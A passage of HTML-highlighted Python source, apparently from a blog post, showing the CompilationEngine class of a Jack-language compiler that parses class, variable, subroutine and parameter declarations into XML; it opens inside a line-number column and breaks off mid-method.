class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> JackTokenizer <span class="keyword">import</span> JackTokenizer,TOKEN_TYPE,KEYWORD_TYPE,tokentype,tokendict</span><br><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CompilationEngine</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,infile)</span>:</span></span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.parser = JackTokenizer(infile)</span><br><span class="line">        outfile = infile[:infile.find(<span class="string">".jack"</span>)] + <span class="string">".xml"</span></span><br><span class="line">        self.out = open(outfile,<span class="string">"w"</span>)</span><br><span class="line">        self.depth = <span class="number">0</span></span><br><span class="line">        self.compileClass()</span><br><span class="line">        self.out.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowerLevel</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upperLevel</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.depth -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileOut</span><span class="params">(self,str)</span>:</span></span><br><span class="line">        self.out.write(<span class="string">"  "</span>*self.depth)</span><br><span class="line">        self.out.write(str)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileOutElement</span><span class="params">(self,tkType,tkStr)</span>:</span></span><br><span class="line">        self.out.write(<span class="string">"  "</span>*self.depth)</span><br><span class="line">        typeStr = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> tkType == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            typeStr = <span class="string">"keyword"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            typeStr = <span class="string">"symbol"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            typeStr = <span class="string">"identifier"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            typeStr = <span class="string">"integerConstant"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            typeStr = <span class="string">"stringConstant"</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_INVALID:</span><br><span class="line">            typeStr = <span class="string">"invalid"</span></span><br><span class="line">        self.out.write(<span class="string">"&lt;"</span> + typeStr + <span class="string">"&gt; "</span> + tkStr + <span class="string">" &lt;/"</span> + typeStr + <span class="string">"&gt;\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileClass</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;class&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse class</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"class"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse class name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse symbol '&#123;' </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#parse class val des</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">              (self.parser.keyWord() == <span class="string">"static"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"field"</span>):</span><br><span class="line">            self.compileClassVarDec()</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#parse class method</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">            (self.parser.keyWord() == <span class="string">"method"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"constructor"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"function"</span>):</span><br><span class="line">            self.compileSubroutine()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#parse symbol '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid class define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of parse class</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/class&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>          </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileClassVarDec</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;classVarDec&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">          (self.parser.keyWord() == <span class="string">"static"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"field"</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse val type</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">or</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse val name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the left val name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">";"</span>):</span><br><span class="line">            <span class="comment"># parse symbol ','</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse val name</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">";"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of class var descrtion</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/classVarDec&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileSubroutine</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;subroutineDec&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.keyWord() == <span class="string">"constructor"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"function"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"method"</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse type</span></span><br><span class="line">        <span class="keyword">if</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.keyWord() == <span class="string">"int"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"char"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"void"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">"boolean"</span>)) <span class="keyword">or</span> \</span><br><span class="line">            self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">           <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">           <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse subroutineName</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse param list</span></span><br><span class="line">        self.compileParameterList()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse body</span></span><br><span class="line">        self.compileSubroutineBody()</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/subroutineDec&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileSubroutineBody</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;subroutineBody&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid sub routine body define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var </span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"var"</span>:</span><br><span class="line">            self.compileVarDec()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid sub routine body define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/subroutineBody&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileParameterList</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;parameterList&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse rest param</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span>\</span><br><span class="line">            self.parser.symbol() == <span class="string">")"</span>):</span><br><span class="line">            <span class="comment"># parse first element type</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER <span class="keyword">or</span> \</span><br><span class="line">               (self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">               (self.parser.keyWord() == <span class="string">"int"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"char"</span> <span class="keyword">or</span> \</span><br><span class="line">                self.parser.keyWord() == <span class="string">"boolean"</span>)):</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse first element varName</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse ','</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                <span class="keyword">if</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">elif</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(str(sys._getframe().f_lineno) + <span class="string">"valid param list!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(sys._getframe().f_lineno) + <span class="string">"valid param list!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/parameterList&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileVarDec</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;varDec&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == 